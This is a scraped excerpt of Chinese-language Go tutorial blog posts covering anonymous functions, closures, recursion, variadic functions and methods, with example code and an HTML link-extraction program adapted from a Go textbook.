所有例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140package mainimport ( \"fmt\" \"math\")//匿名函数func main()&#123; //无参匿名函数 func()&#123; fmt.Println(\"jonson\") &#125;() //有参匿名函数 func(data int)&#123; fmt.Println(\"data:\",data) &#125;(5) //有返回值的匿名函数 result:=func(data float64) float64&#123; return math.Sqrt(data) &#125;(9) fmt.Println(\"result:\",result) greet:=func()&#123; fmt.Println(\"greet jonson\") &#125; greet() fmt.Printf(\"greet的类型是%T\\n\",greet) //闭包 greetjonson() //函数作为返回值 makejonson := makeGreeter() fmt.Printf(\"类型：%T，返回值：%v\\n\",makejonson,makejonson()) //闭包做为返回值 makeeven := makeEvenGenerator() fmt.Println(\"makeeven i = \",makeeven()) fmt.Println(\"makeeven i = \",makeeven()) fmt.Println(\"makeeven i = \",makeeven()) //callback函数作为参数 visit([]int&#123;1,2,3,4&#125;,func(n int)&#123; fmt.Println(n+1) &#125;) //死循环 fmt.Println(factorial(5)) var i uint = 0 for ;i&lt;20;i++&#123; fmt.Println(fabicc(i)) &#125;&#125;//闭包func greetjonson()&#123; x:=0 increment:= func() int&#123; x++ return x &#125; fmt.Println(increment()) fmt.Println(increment())&#125;//函数作为返回值func makeGreeter() func() string&#123; return func() string &#123; return \"hello jonson\" &#125;&#125;//闭包与函数返回值func makeEvenGenerator() func() int&#123; i:=0 return func() int&#123; i+=2 return i &#125;&#125;//callback函数作为参数func visit(numbers []int,callback func(int))&#123; for _,n :=range numbers&#123; callback(n) &#125;&#125;//递归// 计算阶乘 5 5*4*3*2*1func factorial(x uint) uint&#123; if x==0&#123; return 1 &#125; return x * factorial(x-1)&#125;//fabiccfunc fabicc(x uint) uint&#123; if(x==0)&#123; return 0 &#125; if(x==1)&#123; return 1 &#125; return fabicc(x-2) + fabicc(x-1)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[10]-function","slug":"golang-10-function","date":"2018-11-19T07:13:43.000Z","updated":"2019-02-23T09:12:30.718Z","comments":true,"path":"2018/11/19/golang-10-function/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/golang-10-function/","excerpt":"","text":"函数的开括号{必须与函数的结尾在同一行，不是在一行上 无参函数 123func printstring()&#123; fmt.Println(\"hello jonson\")&#125; 带参函数 123func add(a,b int)&#123; fmt.Println(\"a+b=\",a+b)&#125; 返回值 123func addres(a,b int) int&#123; return a+b&#125; 有名字的返回值 1234func addresname(a,b int)(sum int)&#123; sum = a+b return&#125; 多返回值 123456func addmuti(a,b int)(int,int)&#123; add := a+b mul:= a*b return add,mul&#125; 不定个数参数 1234567func addsum(nums ... int) int&#123; var sum int for _,value :=range nums&#123; sum +=value &#125; return sum&#125; 例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package mainimport \"fmt\"func main()&#123; printstring() add(2,4) fmt.Println(\"addres 6+7 = \",addres(6,7)) fmt.Println(\"addresname 3+4 = \",addresname(3,4)) add,sum :=addmuti(5,6) fmt.Printf(\"addmuti 5+6=%d,5*6=%d\\n\",add,sum) ADDsum := addsum(1,2,3,4,5) fmt.Println(\"addsum = \",ADDsum)&#125;//无参函数func printstring()&#123; fmt.Println(\"hello jonson\")&#125;//带参函数 func add(a,b int)&#123; fmt.Println(\"a+b=\",a+b) &#125;//返回值func addres(a,b int) int&#123; return a+b&#125;// 有名字的返回值func addresname(a,b int)(sum int)&#123; sum = a+b return&#125;//多返回值func addmuti(a,b int)(int,int)&#123; add := a+b mul:= a*b return add,mul&#125;//不定个数参数func addsum(nums ... int) int&#123; var sum int for _,value :=range nums&#123; sum +=value &#125; return sum&#125;函数声明包括函数名、形式参数列表、返回值列表（可省略）以及函数体。func name(parameter-list) (result-list) &#123; body&#125;形式参数列表描述了函数的参数名以及参数类型。这些参数作为局部变量，其值由参数调用者提供。返回值列表描述了函数返回值的变量名以及类型。如果函数返回一个无名变量或者没有返回值，返回值列表的括号是可以省略的。如果一个函数声明不包括返回值列表，那么函数体执行完毕后，不会返回任何值。在hypot函数中,func hypot(x, y float64) float64 &#123; return math.Sqrt(x*x + y*y)&#125;fmt.Println(hypot(3,4)) // \"5\"x和y是形参名,3和4是调用时的传入的实数，函数返回了一个float64类型的值。返回值也可以像形式参数一样被命名。在这种情况下，每个返回值被声明成一个局部变量，并根据该返回值的类型，将其初始化为0。如果一个函数在声明时，包含返回值列表，该函数必须以return语句结尾，除非函数明显无法运行到结尾处。例如函数在结尾时调用了panic异常或函数中存在无限循环。正如hypot一样，如果一组形参或返回值有相同的类型，我们不必为每个形参都写出参数类型。下面2个声明是等价的：func f(i, j, k int, s, t string) &#123; /* ... */ &#125;func f(i int, j int, k int, s string, t string) &#123; /* ... */ &#125;下面，我们给出4种方法声明拥有2个int型参数和1个int型返回值的函数.blank identifier(译者注：卽下文的_符号)可以强调某个参数未被使用。func add(x int, y int) int &#123;return x + y&#125;func sub(x, y int) (z int) &#123; z = x - y; return&#125;func first(x int, _ int) int &#123; return x &#125;func zero(int, int) int &#123; return 0 &#125;fmt.Printf(\"%T\\n\", add) // \"func(int, int) int\"fmt.Printf(\"%T\\n\", sub) // \"func(int, int) int\"fmt.Printf(\"%T\\n\", first) // \"func(int, int) int\"fmt.Printf(\"%T\\n\", zero) // \"func(int, int) int\"函数的类型被称为函数的标识符。如果两个函数形式参数列表和返回值列表中的变量类型一一对应，那么这两个函数被认为有相同的类型和标识符。形参和返回值的变量名不影响函数标识符也不影响它们是否可以以省略参数类型的形式表示。每一次函数调用都必须按照声明顺序为所有参数提供实参（参数值）。在函数调用时，Go语言没有默认参数值，也没有任何方法可以通过参数名指定形参，因此形参和返回值的变量名对于函数调用者而言没有意义。在函数体中，函数的形参作为局部变量，被初始化为调用者提供的值。函数的形参和有名返回值作为函数最外层的局部变量，被存储在相同的词法块中。实参通过值的方式传递，因此函数的形参是实参的拷贝。对形参进行修改不会影响实参。但是，如果实参包括引用类型，如指针，slice(切片)、map、function、channel等类型，实参可能会由于函数的简介引用被修改。你可能会偶尔遇到没有函数体的函数声明，这表示该函数不是以Go实现的。这样的声明定义了函数标识符。package mathfunc Sin(x float64) float //implemented in assembly language 函数可以是递归的，这意味着函数可以直接或间接的调用自身。对许多问题而言，递归是一种强有力的技术，例如处理递归的数据结构。 递归 函数可以是递归的，这意味着函数可以直接或间接的调用自身。对许多问题而言，递归是一种强有力的技术，例如处理递归的数据结构。在4.4节，我们通过遍历二叉树来实现简单的插入排序，在本章节，我们再次使用它来处理HTML文件。 下文的示例代码使用了非标准包golang.org/x/net/html ，解析HTML。golang.org/x/… 目录下存储了一些由Go团队设计、维护，对网络编程、国际化文件处理、移动平台、图像处理、加密解密、开发者工具提供支持的扩展包。未将这些扩展包加入到标准库原因有二，一是部分包仍在开发中，二是对大多数Go语言的开发者而言，扩展包提供的功能很少被使用。 例子中调用golang.org/x/net/html的部分api如下所示。html.Parse函数读入一组bytes.解析后，返回html.node类型的HTML页面树状结构根节点。HTML拥有很多类型的结点如text（文本）,commnets（注释）类型，在下面的例子中，我们只关注&lt; name key=‘value’ &gt;形式的结点。 12345678910111213141516171819202122232425package htmltype Node struct &#123; Type NodeType Data string Attr []Attribute FirstChild, NextSibling *Node&#125;type NodeType int32const ( ErrorNode NodeType = iota TextNode DocumentNode ElementNode CommentNode DoctypeNode)type Attribute struct &#123; Key, Val string&#125;func Parse(r io.Reader) (*Node, error) main函数解析HTML标准输入，通过递归函数visit获得links（链接），并打印出这些links： 1234567891011121314151617181920// Findlinks1 prints the links in an HTML document read from standard input.package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;golang.org/x/net/html&quot;)func main() &#123; doc, err := html.Parse(os.Stdin) if err != nil &#123; fmt.Fprintf(os.Stderr, &quot;findlinks1: %v\\n&quot;, err) os.Exit(1) &#125; for _, link := range visit(nil, doc) &#123; fmt.Println(link) &#125;&#125; visit函数遍历HTML的节点树，从每一个anchor元素的href属性获得link,将这些links存入字符串数组中，并返回这个字符串数组。 // visit appends to links each link found in n and returns the result. 12345678910111213func visit(links []string, n *html.Node) []string &#123; if n.Type == html.ElementNode &amp;&amp; n.Data == &quot;a&quot; &#123; for _, a := range n.Attr &#123; if a.Key == &quot;href&quot; &#123; links = append(links, a.Val) &#125; &#125; &#125; for c := n.FirstChild; c != nil; c = c.NextSibling &#123; links = visit(links, c) &#125; return links&#125; 为了遍历结点n的所有后代结点，每次遇到n的孩子结点时，visit递归的调用自身。这些孩子结点存放在FirstChild链表中。 让我们以Go的主页（golang.org）作为目标，运行findlinks。我们以fetch（1.5章）的输出作为findlinks的输入。下面的输出做了简化处理。 $ go build gopl.io/ch1/fetch $ go build gopl.io/ch5/findlinks1 $ ./fetch https://golang.org | ./findlinks1 /doc/ /pkg/ /help/ /blog/ http://play.golang.org/ //tour.golang.org/ https://golang.org/dl/ //blog.golang.org/ /LICENSE /doc/tos.html http://www.google.com/intl/en/policies/privacy/ 注意在页面中出现的链接格式，在之后我们会介绍如何将这些链接，根据根路径（https://golang.org）生成可以直接访问的url。 在函数outline中，我们通过递归的方式遍历整个HTML结点树，并输出树的结构。在outline内部，每遇到一个HTML元素标签，就将其入栈，并输出。 1234567891011121314151617func main() &#123; doc, err := html.Parse(os.Stdin) if err != nil &#123; fmt.Fprintf(os.Stderr, &quot;outline: %v\\n&quot;, err) os.Exit(1) &#125; outline(nil, doc)&#125;func outline(stack []string, n *html.Node) &#123; if n.Type == html.ElementNode &#123; stack = append(stack, n.Data) // push tag fmt.Println(stack) &#125; for c := n.FirstChild; c != nil; c = c.NextSibling &#123; outline(stack, c) &#125;&#125; 有一点值得注意：outline有入栈操作，但没有相对应的出栈操作。当outline调用自身时，被调用者接收的是stack的拷贝。被调用者的入栈操作，修改的是stack的拷贝，而不是调用者的stack,因对当函数返回时,调用者的stack并未被修改。 下面是https://golang.org页面的简要结构: $ go build gopl.io/ch5/outline $ ./fetch https://golang.org | ./outline [html] [html head] [html head meta] [html head title] [html head link] [html body] [html body div] [html body div] [html body div div] [html body div div form] [html body div div form div] [html body div div form div a] … 正如你在上面实验中所见，大部分HTML页面只需几层递归就能被处理，但仍然有些页面需要深层次的递归。 大部分编程语言使用固定大小的函数调用栈，常见的大小从64KB到2MB不等。固定大小栈会限制递归的深度，当你用递归处理大量数据时，需要避免栈溢出；除此之外，还会导致安全性问题。与相反,Go语言使用可变栈，栈的大小按需增加(初始时很小)。这使得我们使用递归时不必考虑溢出和安全问题。 递归案例 获取链接 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package mainimport ( \"fmt\" \"os\" \"golang.org/x/net/html\" \"io/ioutil\" \"bytes\")func main() &#123; allbyte,_:= ioutil.ReadFile(\"index.html\") fmt.Println(allbyte) doc, err := html.Parse( bytes.NewReader(allbyte)) if err != nil &#123; fmt.Fprintf(os.Stderr, \"findlinks1: %v\\n\", err) os.Exit(1) &#125; for _, link := range visit(nil, doc) &#123; fmt.Println(link) &#125;&#125;//!-main//!+visit// visit appends to links each link found in n and returns the result.func visit(links []string, n *html.Node) []string &#123; if n.Type == html.ElementNode &amp;&amp; n.Data == \"a\" &#123; for _, a := range n.Attr &#123; if a.Key == \"href\" &#123; links = append(links, a.Val) &#125; &#125; &#125; for c := n.FirstChild; c != nil; c = c.NextSibling &#123; links = visit(links, c) &#125; return links&#125;//!-visit/*//!+htmlpackage htmltype Node struct &#123; Type NodeType Data string Attr []Attribute FirstChild, NextSibling *Node&#125;type NodeType int32const ( ErrorNode NodeType = iota TextNode DocumentNode ElementNode CommentNode DoctypeNode)type Attribute struct &#123; Key, Val string&#125;func Parse(r io.Reader) (*Node, error)//!-html*/ 在Go中，函数被看作第一类值（first-class values）：函数像其他值一样，拥有类型，可以被赋值给其他变量，传递给函数，从函数返回。对函数值（function value）的调用类似函数调用。例子如下： 1234567891011121314151617181920 func square(n int) int &#123; return n * n &#125; func negative(n int) int &#123; return -n &#125; func product(m, n int) int &#123; return m * n &#125; f := square fmt.Println(f(3)) // &quot;9&quot; f = negative fmt.Println(f(3)) // &quot;-3&quot; fmt.Printf(&quot;%T\\n&quot;, f) // &quot;func(int) int&quot; f = product // compile error: can&apos;t assign func(int, int) int to func(int) int函数类型的零值是nil。调用值为nil的函数值会引起panic错误： var f func(int) int f(3) // 此處f的值爲nil,會引起panic錯誤函数值可以与nil比较： var f func(int) int if f != nil &#123; f(3) &#125; 但是函数值之间是不可比较的，也不能用函数值作为map的key。 函数值使得我们不仅仅可以通过数据来参数化函数，亦可通过行为。标准库中包含许多这样的例子。下面的代码展示了如何使用这个技巧。string.Map对字符串中的每个字符调用add1函数，并将每个add1函数的返回值组成一个新的字符串返回给调用者。 12345func add1(r rune) rune &#123; return r + 1 &#125;fmt.Println(strings.Map(add1, &quot;HAL-9000&quot;)) // &quot;IBM.:111&quot;fmt.Println(strings.Map(add1, &quot;VMS&quot;)) // &quot;WNT&quot;fmt.Println(strings.Map(add1, &quot;Admix&quot;)) // &quot;Benjy&quot; 可变参数 参数数量可变的函数称为为可变参数函数。典型的例子就是fmt.Printf和类似函数。Printf首先接收一个的必备参数，之后接收任意个数的后续参数。 在声明可变参数函数时，需要在参数列表的最后一个参数类型之前加上省略符号“…”，这表示该函数会接收任意数量的该类型参数。 1234567func sum(vals...int) int &#123; total := 0 for _, val := range vals &#123; total += val &#125; return total&#125; sum函数返回任意个int型参数的和。在函数体中,vals被看作是类型为[] int的切片。sum可以接收任意数量的int型参数： fmt.Println(sum()) // “0” fmt.Println(sum(3)) // “3” fmt.Println(sum(1, 2, 3, 4)) // “10” 在上面的代码中，调用者隐式的创建一个数组，并将原始参数复制到数组中，再把数组的一个切片作为参数传给被调函数。如果原始参数已经是切片类型，我们该如何传递给sum？只需在最后一个参数后加上省略符。下面的代码功能与上个例子中最后一条语句相同。 values := []int{1, 2, 3, 4} fmt.Println(sum(values…)) // “10” 虽然在可变参数函数内部，…int 型参数的行为看起来很像切片类型，但实际上，可变参数函数和以切片作为参数的函数是不同的。 1234func f(...int) &#123;&#125;func g([]int) &#123;&#125;fmt.Printf(&quot;%T\\n&quot;, f) // &quot;func(...int)&quot;fmt.Printf(&quot;%T\\n&quot;, g) // &quot;func([]int)&quot; 可变参数函数经常被用于格式化字符串。下面的errorf函数构造了一个以行号开头的，经过格式化的错误信息。函数名的后缀f是一种通用的命名规范，代表该可变参数函数可以接收Printf风格的格式化字符串。 func errorf(linenum int, format string, args…interface{}) { fmt.Fprintf(os.Stderr, &quot;Line %d: &quot;, linenum) fmt.Fprintf(os.Stderr, format, args…) fmt.Fprintln(os.Stderr) } linenum, name := 12, “count” errorf(linenum, “undefined: %s”, name) // “Line 12: undefined: count” 方法 在函数声明时，在其名字之前放上一个变量，卽是一个方法。这个附加的参数会将该函数附加到这种类型上，卽相当于为这种类型定义了一个独占的方法。 下面来写我们第一个方法的例子，这个例子在package geometry下： 12345678910111213141516package geometryimport &quot;math&quot;type Point struct&#123; X, Y float64 &#125;// traditional functionfunc Distance(p, q Point) float64 &#123; return math.Hypot(q.X-p.X, q.Y-p.Y)&#125;// same thing, but as a method of the Point typefunc (p Point) Distance(q Point) float64 &#123; return math.Hypot(q.X-p.X, q.Y-p.Y)&#125; 上面的代码里那个附加的参数p，叫做方法的接收器(receiver)，早期的面向对象语言留下的遗产将调用一个方法称为“向一个对象发送消息”。 在Go语言中，我们并不会像其它语言那样用this或者self作为接收器；我们可以任意的选择接收器的名字。由于接收器的名字经常会被使用到，所以保持其在方法间传递时的一致性和简短性是不错的主意。这里的建议是可以使用其类型的第一个字母，比如这里使用了Point的首字母p。 在方法调用过程中，接收器参数一般会在方法名之前出现。这和方法声明是一样的，都是接收器参数在方法名字之前。下面是例子： 1234p := Point&#123;1, 2&#125;q := Point&#123;4, 6&#125;fmt.Println(Distance(p, q)) // &quot;5&quot;, function callfmt.Println(p.Distance(q)) // &quot;5&quot;, method call 可以看到，上面的两个函数调用都是Distance，但是却没有发生冲突。第一个Distance的调用实际上用的是包级别的函数geometry.Distance，而第二个则是使用刚刚声明的Point，调用的是Point类下声明的Point.Distance方法。 这种p.Distance的表达式叫做选择器，因为他会选择合适的对应p这个对象的Distance方法来执行。选择器也会被用来选择一个struct类型的字段，比如pX。由于方法和字段都是在同一命名空间，所以如果我们在这里声明一个X方法的话，编译器会报错，因为在调用pX时会有歧义(译注：这里确实挺奇怪的)。 因为每种类型都有其方法的命名空间，我们在用Distance这个名字的时候，不同的Distance调用指向了不同类型里的Distance方法。让我们来定义一个Path类型，这个Path代表一个线段的集合，并且也给这个Path定义一个叫Distance的方法。 123456789101112// A Path is a journey connecting the points with straight lines.type Path []Point// Distance returns the distance traveled along the path.func (path Path) Distance() float64 &#123; sum := 0.0 for i := range path &#123; if i &gt; 0 &#123; sum += path[i-1].Distance(path[i]) &#125; &#125; return sum&#125; Path是一个命名的slice类型，而不是Point那样的struct类型，然而我们依然可以为它定义方法。在能够给任意类型定义方法这一点上，Go和很多其它的面向对象的语言不太一样。因此在Go语言里，我们为一些简单的数值、字符串、slice、map来定义一些附加行为很方便。方法可以被声明到任意类型，只要不是一个指针或者一个interface。 两个Distance方法有不同的类型。他们两个方法之间没有任何关系，尽管Path的Distance方法会在内部调用Point.Distance方法来计算每个连接邻接点的线段的长度。 让我们来调用一个新方法，计算三角形的周长： perim := Path{ {1, 1}, {5, 1}, {5, 4}, {1, 1}, } fmt.Println(perim.Distance()) // “12” 在上面两个对Distance名字的方法的调用中，编译器会根据方法的名字以及接收器来决定具体调用的是哪一个函数。第一个例子中path[i-1]数组中的类型是Point，因此Point.Distance这个方法被调用；在第二个例子中perim的类型是Path，因此Distance调用的是Path.Distance。 对于一个给定的类型，其内部的方法都必须有唯一的方法名，但是不同的类型却可以有同样的方法名，比如我们这里Point和Path就都有Distance这个名字的方法；所以我们没有必要非在方法名之前加类型名来消除歧义，比如PathDistance。这里我们已经看到了方法比之函数的一些好处：方法名可以简短。当我们在包外调用的时候这种好处就会被放大，因为我们可以使用这个短名字，而可以省略掉包的名字，下面是例子： 12345import &quot;gopl.io/ch6/geometry&quot;perim := geometry.Path&#123;&#123;1, 1&#125;, &#123;5, 1&#125;, &#123;5, 4&#125;, &#123;1, 1&#125;&#125;fmt.Println(geometry.PathDistance(perim)) // &quot;12&quot;, standalone functionfmt.Println(perim.Distance()) // &quot;12&quot;, method of geometry.Path 译注：如果我们要用方法去计算perim的distance，还需要去写全geometry的包名，和其函数名，但是因为Path这个变量定义了一个可以直接用的Distance方法，所以我们可以直接写perim. Distance()。相当于可以少打很多字，作者应该是这个意思。因为在Go里包外调用函数需要带上包名，还是挺麻烦的。 基于指针对象的方法 当调用一个函数时，会对其每一个参数值进行拷贝，如果一个函数需要更新一个变量，或者函数的其中一个参数实在太大我们希望能够避免进行这种默认的拷贝，这种情况下我们就需要用到指针了。对应到我们这里用来更新接收器的对象的方法，当这个接受者变量本身比较大时，我们就可以用其指针而不是对象来声明方法，如下： 1234func (p *Point) ScaleBy(factor float64) &#123; p.X *= factor p.Y *= factor&#125; 这个方法的名字是(*Point).ScaleBy。这里的括号是必须的；没有括号的话这个表达式可能会被理解为*(Point.ScaleBy)。 在现实的程序里，一般会约定如果Point这个类有一个指针作为接收器的方法，那么所有Point的方法都必须有一个指针接收器，卽使是那些并不需要这个指针接收器的函数。我们在这里打破了这个约定只是为了展示一下两种方法的异同而已。 只有类型(Point)和指向他们的指针(*Point)，才是可能会出现在接收器声明里的两种接收器。此外，为了避免歧义，在声明方法时，如果一个类型名本身是一个指针的话，是不允许其出现在接收器中的，比如下面这个例子： 12type P *intfunc (P) f() &#123; /* ... */ &#125; // compile error: invalid receiver type 想要调用指针类型方法(*Point).ScaleBy，只要提供一个Point类型的指针卽可，像下面这样。 123456789101112r := &amp;Point&#123;1, 2&#125;r.ScaleBy(2)fmt.Println(*r) // &quot;&#123;2, 4&#125;&quot;或者这样：p := Point&#123;1, 2&#125;pptr := &amp;ppptr.ScaleBy(2)fmt.Println(p) // &quot;&#123;2, 4&#125;&quot;或者这样:p := Point&#123;1, 2&#125;(&amp;p).ScaleBy(2)fmt.Println(p) // &quot;&#123;2, 4&#125;&quot; 不过后面两种方法有些笨拙。幸运的是，go语言本身在这种地方会帮到我们。如果接收器p是一个Point类型的变量，并且其方法需要一个Point指针作为接收器，我们可以用下面这种简短的写法： p.ScaleBy(2) 编译器会隐式地帮我们用&amp;p去调用ScaleBy这个方法。这种简写方法只适用于“变量”，包括struct里的字段比如pX，以及array和slice内的元素比如perim[0]。我们不能通过一个无法取到地址的接收器来调用指针方法，比如临时变量的内存地址就无法获取得到： 1Point&#123;1, 2&#125;.ScaleBy(2) // compile error: can&apos;t take address of Point literal 但是我们可以用一个Point这样的接收器来调用Point的方法，因为我们可以通过地址来找到这个变量，只要用解引用符号来取到该变量卽可。编译器在这里也会给我们隐式地插入*这个操作符，所以下面这两种写法等价的： 12pptr.Distance(q)(*pptr).Distance(q) 这里的几个例子可能让你有些困惑，所以我们总结一下：在每一个合法的方法调用表达式中，也就是下面三种情况里的任意一种情况都是可以的： 不论是接收器的实际参数和其接收器的形式参数相同，比如两者都是类型T或者都是类型*T： 12Point&#123;1, 2&#125;.Distance(q) // Pointpptr.ScaleBy(2) // *Point 或者接收器形参是类型T，但接收器实参是类型T，这种情况下编译器会隐式地为我们取变量的地址： p.ScaleBy(2) // implicit (&amp;p) 或者接收器形参是类型T，实参是类型T。编译器会隐式地为我们解引用，取到指针指向的实际变量： pptr.Distance(q) // implicit (*pptr) 如果类型T的所有方法都是用T类型自己来做接收器(而不是*T)，那么拷贝这种类型的实例就是安全的；调用他的任何一个方法也就会产生一个值的拷贝。比如time.Duration的这个类型，在调用其方法时就会被全部拷贝一份，包括在作为参数传入函数的时候。但是如果一个方法使用指针作为接收器，你需要避免对其进行拷贝，因为这样可能会破坏掉该类型内部的不变性。比如你对bytes.Buffer对象进行了拷贝，那么可能会引起原始对象和拷贝对象只是别名而已，但实际上其指向的对象是一致的。紧接着对拷贝后的变量进行修改可能会有让你意外的结果。 译注：作者这里说的比较绕，其实有两点： 1.不管你的method的receiver是指针类型还是非指针类型，都是可以通过指针/非指针类型进行调用的，编译器会帮你做类型转换2.在声明一个method的receiver该是指针还是非指针类型时，你需要考虑两方面的内部，第一方面是这个对象本身是不是特别大，如果声明为非指针变量时，调用会产生一次拷贝；第二方面是如果你用指针类型作为receiver，那么你一定要注意，这种指针类型指向的始终是一块内存地址，就算你对其进行了拷贝。熟悉C或者C艹的人这里应该很快能明白。 通过嵌入结构体来扩展类型 来看看ColoredPoint这个类型： 12345678910// type RGBA struct &#123;// R, G, B, A uint8// &#125;import \"image/color\"type Point struct&#123; X, Y float64 &#125;type ColoredPoint struct &#123; Point Color color.RGBA&#125; 我们完全可以将ColoredPoint定义为一个有三个字段的struct，但是我们却将Point这个类型嵌入到ColoredPoint来提供X和Y这两个字段。内嵌可以使我们在定义ColoredPoint时得到一种句法上的简写形式，并使其包含Point类型所具有的一切字段，然后再定义一些自己的。如果我们想要的话，我们可以直接认为通过嵌入的字段就是ColoredPoint自身的字段，而完全不需要在调用时指出Point，比如下面这样。 12345var cp ColoredPointcp.X = 1fmt.Println(cp.Point.X) // &quot;1&quot;cp.Point.Y = 2fmt.Println(cp.Y) // &quot;2&quot; 对于Point中的方法我们也有类似的用法，我们可以把ColoredPoint类型当作接收器来调用Point里的方法，卽使ColoredPoint里没有声明这些方法： 12345678red := color.RGBA&#123;255, 0, 0, 255&#125;blue := color.RGBA&#123;0, 0, 255, 255&#125;var p = ColoredPoint&#123;Point&#123;1, 1&#125;, red&#125;var q = ColoredPoint&#123;Point&#123;5, 4&#125;, blue&#125;fmt.Println(p.Distance(q.Point)) // &quot;5&quot;p.ScaleBy(2)q.ScaleBy(2)fmt.Println(p.Distance(q.Point)) // &quot;10&quot; Point类的方法也被引入了ColoredPoint。用这种方式，内嵌可以使我们定义字段特别多的复杂类型，我们可以将字段先按小类型分组，然后定义小类型的方法，之后再把它们组合起来。 读者如果对基于类来实现面向对象的语言比较熟悉的话，可能会倾向于将Point看作一个基类，而ColoredPoint看作其子类或者继承类，或者将ColoredPoint看作&quot;is a&quot; Point类型。但这是错误的理解。请注意上面例子中对Distance方法的调用。Distance有一个参数是Point类型，但q并不是一个Point类，所以尽管q有着Point这个内嵌类型，我们也必须要显式地选择它。尝试直接传q的话你会看到下面这样的错误： p.Distance(q) // compile error: cannot use q (ColoredPoint) as Point 一个ColoredPoint并不是一个Point，但他&quot;has a&quot;Point，并且它有从Point类里引入的Distance和ScaleBy方法。如果你喜欢从实现的角度来考虑问题，内嵌字段会指导编译器去生成额外的包装方法来委托已经声明好的方法，和下面的形式是等价的： 1234567func (p ColoredPoint) Distance(q Point) float64 &#123; return p.Point.Distance(q)&#125;func (p *ColoredPoint) ScaleBy(factor float64) &#123; p.Point.ScaleBy(factor)&#125; 当Point.Distance被第一个包装方法调用时，它的接收器值是p.Point，而不是p，当然了，在Point类的方法里，你是访问不到ColoredPoint的任何字段的。 在类型中内嵌的匿名字段也可能是一个命名类型的指针，这种情况下字段和方法会被间接地引入到当前的类型中(译注：访问需要通过该指针指向的对象去取)。添加这一层间接关系让我们可以共享通用的结构并动态地改变对象之间的关系。下面这个ColoredPoint的声明内嵌了一个*Point的指针。 1234567891011type ColoredPoint struct &#123; *Point Color color.RGBA&#125;p := ColoredPoint&#123;&amp;Point&#123;1, 1&#125;, red&#125;q := ColoredPoint&#123;&amp;Point&#123;5, 4&#125;, blue&#125;fmt.Println(p.Distance(*q.Point)) // &quot;5&quot;q.Point = p.Point // p and q now share the same Pointp.ScaleBy(2)fmt.Println(*p.Point, *q.Point) // &quot;&#123;2 2&#125; &#123;2 2&#125;&quot; 一个struct类型也可能会有多个匿名字段。我们将ColoredPoint定义为下面这样： type ColoredPoint struct { Point color.RGBA } 然后这种类型的值便会拥有Point和RGBA类型的所有方法，以及直接定义在ColoredPoint中的方法。当编译器解析一个选择器到方法时，比如p.ScaleBy，它会首先去找直接定义在这个类型里的ScaleBy方法，然后找被ColoredPoint的内嵌字段们引入的方法，然后去找Point和RGBA的内嵌字段引入的方法，然后一直递归向下找。如果选择器有二义性的话编译器会报错，比如你在同一级里有两个同名的方法。 方法只能在命名类型(像Point)或者指向类型的指针上定义，但是多亏了内嵌，有些时候我们给匿名struct类型来定义方法也有了手段。 下面是一个小trick。这个例子展示了简单的cache，其使用两个包级别的变量来实现，一个mutex互斥量(§9.2)和它所操作的cache： 1234567891011var ( mu sync.Mutex // guards mapping mapping = make(map[string]string))func Lookup(key string) string &#123; mu.Lock() v := mapping[key] mu.Unlock() return v&#125; 下面这个版本在功能上是一致的，但将两个包级吧的变量放在了cache这个struct一组内： 1234567891011121314var cache = struct &#123; sync.Mutex mapping map[string]string&#125;&#123; mapping: make(map[string]string),&#125;func Lookup(key string) string &#123; cache.Lock() v := cache.mapping[key] cache.Unlock() return v&#125; 我们给新的变量起了一个更具表达性的名字：cache。因为sync.Mutex字段也被嵌入到了这个struct里，其Lock和Unlock方法也就都被引入到了这个匿名结构中了，这让我们能够以一个简单明了的语法来对其进行加锁解锁操作。 方法值和方法表达式 我们经常选择一个方法，并且在同一个表达式里执行，比如常见的p.Distance()形式，实际上将其分成两步来执行也是可能的。p.Distance叫作“选择器”，选择器会返回一个方法&quot;值&quot;-&gt;一个将方法(Point.Distance)绑定到特定接收器变量的函数。这个函数可以不通过指定其接收器卽可被调用；卽调用时不需要指定接收器(译注：因为已经在前文中指定过了)，只要传入函数的参数卽可： 123456789101112p := Point&#123;1, 2&#125;q := Point&#123;4, 6&#125;distanceFromP := p.Distance // method valuefmt.Println(distanceFromP(q)) // &quot;5&quot;var origin Point // &#123;0, 0&#125;fmt.Println(distanceFromP(origin)) // &quot;2.23606797749979&quot;, sqrt(5)scaleP := p.ScaleBy // method valuescaleP(2) // p becomes (2, 4)scaleP(3) // then (6, 12)scaleP(10) // then (60, 120) 在一个包的API需要一个函数值、且调用方希望操作的是某一个绑定了对象的方法的话，方法&quot;值&quot;会非常实用。举例来说，下面例子中的time.AfterFunc这个函数的功能是在指定的延迟时间之后来执行一个(译注：另外的)函数。且这个函数操作的是一个Rocket对象r 1234type Rocket struct &#123; /* ... */ &#125;func (r *Rocket) Launch() &#123; /* ... */ &#125;r := new(Rocket)time.AfterFunc(10 * time.Second, func() &#123; r.Launch() &#125;) 直接用方法&quot;值&quot;传入AfterFunc的话可以更为简短： time.AfterFunc(10 * time.Second, r.Launch) 译注：省掉了上面那个例子里的匿名函数。 和方法&quot;值&quot;相关的还有方法表达式。当调用一个方法时，与调用一个普通的函数相比，我们必须要用选择器(p.Distance)语法来指定方法的接收器。 当T是一个类型时，方法表达式可能会写作Tf或者(*T).f，会返回一个函数&quot;值&quot;，这种函数会将其第一个参数用作接收器，所以可以用通常(译注：不写选择器)的方式来对其进行调用： 1234567891011p := Point&#123;1, 2&#125;q := Point&#123;4, 6&#125;distance := Point.Distance // method expressionfmt.Println(distance(p, q)) // &quot;5&quot;fmt.Printf(&quot;%T\\n&quot;, distance) // &quot;func(Point, Point) float64&quot;scale := (*Point).ScaleByscale(&amp;p, 2)fmt.Println(p) // &quot;&#123;2 4&#125;&quot;fmt.Printf(&quot;%T\\n&quot;, scale) // &quot;func(*Point, float64)&quot; // 譯註：這個Distance實際上是指定了Point對象爲接收器的一個方法func (p Point) Distance()， // 